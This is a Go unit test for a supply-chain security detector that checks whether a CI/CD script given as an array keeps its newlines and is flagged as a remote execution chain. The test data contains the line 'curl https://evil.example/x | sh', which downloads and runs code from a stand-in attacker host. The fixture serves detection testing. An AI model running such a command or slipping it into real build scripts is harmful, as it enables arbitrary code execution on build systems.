package supplychain

import (
	"github.com/1sec-project/1sec/internal/core"
	"testing"
)

func TestCICDScriptArrayPreservesNewlinesAndDetection(t *testing.T) {
	for _, script := range []interface{}{[]string{"MODEL_PATH=valid", "curl https://evil.example/x | sh"}, []interface{}{"MODEL_PATH=valid", "curl https://evil.example/x | sh"}} {
		cp := newCapPipeline()
		s := startedSentinel(t, cp.pipeline)
		e := core.NewSecurityEvent("test", "pipeline_change", core.SeverityInfo, "")
		e.Details["script"] = script
		e.Details["pipeline_name"] = "build"
		if getStringDetail(e, "script") != "MODEL_PATH=valid\ncurl https://evil.example/x | sh" {
			t.Fatal("array boundary lost")
		}
		s.handleCICDEvent(e)
		if cp.count() == 0 {
			t.Fatal("remote execution chain missed")
		}
	}
}
